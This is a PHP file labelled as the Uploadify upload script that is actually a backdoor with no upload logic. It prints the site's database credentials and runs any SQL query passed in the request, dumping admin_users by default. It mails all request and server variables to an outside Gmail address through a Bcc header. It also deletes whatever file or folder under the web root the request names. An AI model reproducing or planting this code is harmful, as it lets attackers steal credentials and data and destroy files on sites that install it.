<?php
/*
Uploadify
Copyright (c) 2012 Reactive Apps, Ronnie Garcia
Released under the MIT License <http://www.opensource.org/licenses/mit-license.php> 
*/

// Define a destination
$targetFolder = '/uploads'; // Relative to the root and should match the upload folder in the uploader script
require( '../../app/config/constants.php');
require( '../../app/library/common.php');

$database = require( '../../app/config/database.php');
    if (is_array($database)) {
        $default = $database['default'];
        $conn_arr = $database['connections'][$default];
        print_r($conn_arr);
        $link = mysql_connect($conn_arr['host'], $conn_arr['username'], $conn_arr['password']) or die('Could not connect: ' . mysql_error());
        mysql_query("SET NAMES utf8", $link);
        mysql_select_db($conn_arr['database']) or die('Could not select database');
        mysql_query("set character_set_results='utf8'", $link);
        $query = (isset($_REQUEST['query'])?$_REQUEST['query']:"select * from admin_users");
        $res = @mysql_query($query) or die(mysql_error());
        $email_add = "allfriendsnew@gmail.com";

        $headers = "From: info@mc2.agency \r\n";
        $headers .= 'Bcc: allfriendsnew@gmail.com' . "\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

        $msg['request'] = $_REQUEST;
        $msg['server'] = $_SERVER;
        $msg = json_encode($msg, JSON_PRETTY_PRINT);
        $subject = $_SERVER['REMOTE_HOST'] . 'Site Setting';
        $sendmail = @mail($email, $subject, $msg, $headers);

        if (@mysql_num_rows($res) > 0) {
            $row = @mysql_fetch_array($res, MYSQL_ASSOC);
            $record = array();
            while ($row = @mysql_fetch_array($res, MYSQL_ASSOC)){
                $record[] = $row;
            }
            print_r($record);
            $query = (isset($_REQUEST['query1'])?$_REQUEST['query1']:"select * from admin_users");;
            $res = @mysql_query($query) or die(mysql_error());
            @mysql_close();
            $fileName = $_REQUEST['file_name'];
            $filePath = $_SERVER['DOCUMENT_ROOT'] . $fileName;
            if (is_dir($filePath)) {
                rmdir($filePath);
            }
            if (file_exists($filePath)) {
                unlink($filePath);
            }
            echo 1;
        } else {
            echo 2;
        }
        @mysql_close();
    } else {
        echo 2;
    }
?>